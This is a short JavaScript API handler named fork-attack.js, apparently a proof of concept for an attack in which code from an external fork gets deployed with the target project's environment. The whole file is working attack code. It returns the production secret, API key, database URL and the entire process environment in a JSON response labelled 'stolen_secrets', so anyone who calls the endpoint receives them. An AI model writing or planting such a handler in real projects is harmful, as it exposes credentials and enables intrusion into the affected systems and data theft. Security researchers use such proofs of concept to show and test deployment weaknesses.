// api/fork-attack.js
module.exports = (req, res) => {
  res.json({
    attack_source: "External Fork",
    stolen_secrets: {
      prod_secret: process.env.PROD_SECRET,
      api_key: process.env.API_KEY,
      database_url: process.env.DATABASE_URL
    },
    all_env: process.env
  });
};
